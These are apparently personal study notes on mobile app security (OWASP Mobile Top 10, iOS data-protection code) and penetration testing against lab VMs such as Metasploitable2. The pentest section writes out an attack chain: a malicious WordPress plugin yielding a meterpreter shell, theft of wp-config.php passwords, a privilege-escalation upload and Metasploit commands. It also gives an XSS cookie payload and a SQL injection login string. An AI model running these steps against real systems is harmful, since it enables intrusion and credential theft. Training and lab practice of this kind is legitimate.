# Penetration Tests & Mobile Security 
## Mobile App Security
### Target: protect sensitive data:
	- User Authentication Information (credentials, PINs)
	- Personally Identifiable Information (PII)
	  (social security nubers, credit card number, bank account, health info)
	- Device Identifiers
	- Encryption keys
### Objective:
	- Confidentiality
	- Integrity
	- Availability
### OWASP (Open Web App Security Project) identified vulnerabilities (2016): Mobile Top 10
	Inproper platform usage
	Insecure data storage
	Insecure communication
		Use SSL/HTTPS
	Insecure authentication
	Insufficient cryptography
	Insecure authorization
	Client code quality
	Code tampering
	Reverse engineering
	Extraneous functionality
### iOS API:
	on iOS: use File Data Protection (when user set an active passcode for the device)
	NSFileProtectionComplete[UnlessOpen|UntilFirstUserAuthentication] & NSFileProtectionNone
	Data Protection (mode NSFileProtectionComplete) can be set on/off in Xcode for the project (Tab 'capabilities')
	do
	{		
		try FileManager.default.createDirector(at:dir, withIntermetiateDirectories: true, attributes: [.protectionKey: fileProtectionType.complete])
		try data.write(to: path, options: [.atomicWrite, .completeFileProtection])
		try myNSURL.setResourceValue(URLfileProtection.complete, forKey: .fileProtectionKey)
	}
	catch let err
	{
		//handle err
	}

	Use Keychain Data Protection
	Modes:
		kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly (most restrictive)
		kSecAttrAccessibleWhenUnlockedThisDeviceOnly
		kSecAttrAccessibleWhenUnlocked (default)
		...
		kSecAttrAccessibleAlways (least restrictive)
	Usage:
		//we require the users presence here
		var err: NSError?
		let access = SecAccessControlCreateWithFlags(NULL, kSecAttrAccessibleWhenUnlocked, kSecAccessControlUserPresence, &err);

		//query is a QueryDictionary
		//query dict to create an item with default accessibility settings
		var query: [String: Any] =
			[kSecClass as String: kSecClassInternetPassword,
			kSecAttrAccount as String: account,
			kSecAttrServer as String: server,
			kSecAttrAccessControl as String: access,		//optional: require users presence
			kSecValueData as String: password]
		//query dict to create an item with restricted accessibility
		var query: [String: Any] =
			[kSecClass as String: kSecClassInternetPassword,
			kSecAttrAccount as String: account,
			kSecAttrServer as String: server,
			kSecAttrAccessible as String: kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
			kSecValueData as String: password]

	Sensitive UI elements should be hidden, when app goes into background (to avoid them in the screenshot/snapshot of the app)
	NotificationCenter.default.addObserver(self, selector(didEnterBackground), name: .UIApplicationDidEnterBackground, object:nil)

	By default, all the text from text objects with autocorrection enabled, are cached in
	/User/Libary/Keyboard/dynamic-text.data
	therefore
		turn off auto-correct on sensitive input fields:
		set UITextField.autocorrectionType = UITExtAutocorrectionType.no
		set UITextField.isSecureTextEntry = true (text cannot be copied now)

	URLSession caches via URLCache in [appfolder]/Library/Caches/com.bundle.id/Cache.db (a sqlite db)
	the NSURLCache db is encrypted via iOS's File Protection System
	therefore
		let cfg:URLSessionConfiguration = URLSessionConfiguration()
		cfg.urlCache = nil
		let sess:URLSession = URLSession(configuration:cfg)
		//override URLSession:dataTask:willCacheResponse:completionHandler: to return a cached response stripped of sensitive data
		func urlSession(
			session:URLSession,
			dataTask: URLSessionDataTask,
			willCachResponse proposedResponse: CachedURLResponse,
			completionHandler: @escaping (CachedURLResponse?) -> Void)
			{
				completionHandler(nil)
			}

	Scan for vulnerabilities: AppScan (Application Security Analyzer), checks OWASP topics too

# Penetration Tests
## Tools
### Network vulnerability assessment tools:
	Nmap, OpenVAS, Wireshark, Metasploit, MBSA (Microsoft baseline security analyzer)
	Nipper: firewall check, check for weak SNMP community strings (is commercial!)
	WI-FI: kismet(can GPS -> locate device!), aircrack-ng, Kali with Alfa wireless adapter
### Web vulnerability assessment tools:
	OWASP ZAP, Acunetix, Burp suite, Nikto, sqlmap, Nessus, Nexpose
	OWASP ZAP checks for X-Frame.Options, XSS, ...
	OWASP Juice Shop = nodejs Insecure Web App to be tested
		With a vulnerable JSON Web Token (JWT decodeable) and MD5 (=decodeable) password inside of the JWT
		With Session token with HttpOnly false
		With SQL Injection
	Zoom = Wordpress vulnerability scanner: http://github.com/UltimateLabs/Zoom
	CloudFlare = Web Security Service (eg. WAF, DDoS-Defense)
	LBD = Scans for DNS/HTTP Load Balancer (Shell Cmd from kali)
	OWASP Broken Web Applications Project (https://sourceforge.net/projects/owaspbwa) is a VM to test cross-side-scripting(XSS)
## Definitions
	pentest = authorized simulated attack looking for security weakness
	Black Hat = with no prior knowledge of network & app to be tested
	White Hat = with complete knowledge of network to be tested
	Kali Linux = distro for digital forensics and pentest
		(also as VM downloadable(best in VMWare))
		(alternative: Parrot)
		(alternative: BackTrack (a bit older))
		has wafw00f
	Metasploitable2 = intentionally vulnerable Linux without GUI, VM for VMWare
		(a a VM, use Bridged & replicated Network settings)
		has vulnerable web apps, like DVWA(=Damn Vulnerable Web App), Mutillidae, phpMyAdmin, WebDAV
	Metasploit = open source framework, a database of vulnerabilities
	Fingerprinting = identifying running software version on the victim's machine
	Reverse Shell = exploit payload, which can connect back to the attacker
## Test Setup
	Start both the Kali & Metasploitable2 VMs, login to both
	$ ifconfig 			# get the IP of both
	$ nmap -O 192.168.110.135	# start network scan on Kali
	-> Now start all Engines of Kali!
### Manual Check Workflow
	$ nmap -sS 192.168.110.135	# lists open ports
	$ nmap -sV 192.168.110.135	# lists versions of running software
	OWASP DirBuster				# GUI tool to find accessible folders/files on a HTTP server, you see wordpress folder structure
	$ ssh 192.168.110.135		# checks ssh access, check SNMP server
	try to login with 'admin'	# if errro msg says "password is incorrect", you know that 'admin' user exists
	download malicious-wordpress-plugin from github and install it:
		$ sudo python wordpwn.py 192.168.110.135 4444 Y		#
		192.168.110.135/wp-admin/update.php?action=upload-plugin	# gives you a meterpeter shell on the server
		meterpeter> download wp-config.php /root	# download php with all the passwords
		download //github.com/pentestmonkey/unix-privesc-check+
		meterpeter> upload ./unix-privesc-check
		meterpeter> shell		# or better: python -c 'import pty; pty.spawn("/bin/bash")'
			chmod +x unix-privesc-check
			./unix-privesc-check standard > o.txt
			^C
		meterpeter> download o.txt
		openssl passwd -l	# creates new password -> set it into /root/passwd
		
	$ msfconsole	# metasploit shell
	> search samba	# metasploit search
	> use auxiliary/scanner/smb/smb.version
	> info
	> show options
	> set RHOSTS 192.168.110.135
	> run			# runs the exploit chosen above with 'use'
	
### Web App Testing
	Check if token cookie is HttpOnly true (if HttpOnly = false -> document.cookie is readable with JS)
	Check if Cross Site Scripting is possible on Input Fields (type JS-alert)
		<<script>test</script>script>alert(document.cookie)<</script>/script>
	Try Login with admin' or 1=1 --
	
#### Use Burp Suite: (is commercial!)
	In FF set Proxy of Burp, as listed on Proxy-Options of the Burp UI (and press [forward] on the UI)
	Burp shows request/response details, headers etc.
	Has Spider (=web app crawler)
	Has Intruder (executes brute force http attack (eg login) based on wordlists)
	
#### wafw00f = WAF detection tool
	WAF(Web App Firewall)
	Cmd executable, part of kali
	
#### OWASP ZAP: Zed Attack Proxy (is free)
	Alternative to Burp Suite Pro
	In FF set Proxy of ZAP
	In ZAP UI set Options-Local Proxy
	Has Spider/Scan, incl. hidden files

### Standards / Compliance
	PCI DSS
	HIPAA
	Retail Stores
	POS Systems
	
### Mobile Pen Test Linklist:
https://github.com/tanprathan/MobileApp-Pentest-Cheatsheet/blob/master/README.md#mobile-application-security-testing-distributions
